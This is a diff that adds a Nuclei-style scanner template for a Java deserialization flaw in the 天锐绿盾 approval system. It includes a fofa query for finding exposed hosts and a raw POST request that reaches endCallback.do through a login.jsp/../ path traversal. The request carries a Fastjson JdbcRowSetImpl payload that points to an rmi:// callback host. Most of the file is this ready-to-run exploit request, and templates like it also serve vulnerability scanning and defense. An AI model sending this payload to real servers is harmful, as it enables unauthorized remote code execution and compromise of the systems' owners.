@@ -1,0 +1,39 @@
+id: tianrui-greenshield-endcallback-deserialization
+info:
+  name: 天锐绿盾审批系统 endCallback.do 接口反序列化安全缺陷
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="TIPPAY-绿盾审批系统"
+        /rest/ext/app/fileopen/list.do
+        /rest/conf/editConfigVal.do
+        /rest/ext/findUserTrustees.do
+    日期：2025-12-24
+    该系统在endCallback.do接口处理过程中存在Java反序列化安全缺陷，攻击者可通过构造恶意序列化数据包，绕过安全校验机制，在目标服务器上执行任意代码。受影响的/rest/ext/app/fileopen/list.do、/rest/conf/editConfigVal.do及/rest/ext/findUserTrustees.do路径均涉及敏感数据反序列化操作，可能造成系统权限被恶意利用。
+  tags: 天锐绿盾审批系统
+http:
+- raw:
+  - |
+    POST /trwfe/login.jsp/../ws/taskCommon/endCallback.do HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+    Content-Type: application/json
+
+    {
+      "workflowInstanceId": "111",
+      "approval": "pass",
+      "data": [
+        {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{interactsh-url}}/su3hbx", "autoCommit":true}
+      ]
+    }
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 500
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
